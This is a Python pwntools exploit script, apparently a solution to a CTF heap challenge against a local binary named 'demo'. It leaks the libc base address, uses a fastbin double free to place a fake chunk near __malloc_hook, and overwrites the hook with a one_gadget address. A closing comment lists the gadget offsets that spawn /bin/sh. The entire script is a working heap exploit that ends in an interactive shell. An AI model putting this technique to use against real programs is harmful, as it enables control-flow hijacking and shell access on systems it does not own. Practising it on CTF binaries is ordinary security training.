from pwn import *

p=process('./demo')

context.log_level=1

sd=lambda x: p.send(x)
sl=lambda x: p.sendline(x)
rv=lambda x: p.recvuntil(x)
sa=lambda a,x: p.sendafter(a,x)
sla=lambda a,x: p.sendlineafter(a,x)

menu='Choice:'

def add(size,content=''):
    sla(menu,'1')
    sla('input your size:',str(size))
    sla('input your message:',content)

def delete(index):
    sla(menu,'2')
    sla('input the index: ',str(index))

def edit(index,content):
    sla(menu,'3')
    sla('input the index: ',str(index))
    sla('input your content:',content)

def show(index):
    sla(menu,'4')
    sla('input the index: ',str(index))

chunk_link=0x6020c0

#=========================
# leak libc_base

add(0x100)
add(0x100)
delete(0)
show(0)
rv('content:')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4b78
success("libc base:"+hex(libc_base))
delete(1)

#===================================
# now exploit
add(0x68)      #2
add(0x68)      #3
add(0x68)      #4 avoid chunk count overflow to 0xFFFF....

# double free
delete(2)
delete(3)
delete(2)

# fake the fd to __malloc_hook
add(0x68,p64(libc_base+0x3c4aed))
add(0x68)
add(0x68)
# rewrite to one_gadget
add(0x68,'a'*0x13+p64(libc_base+0x4526a))
#gdb.attach(p)

add(0x233)
p.interactive()


'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

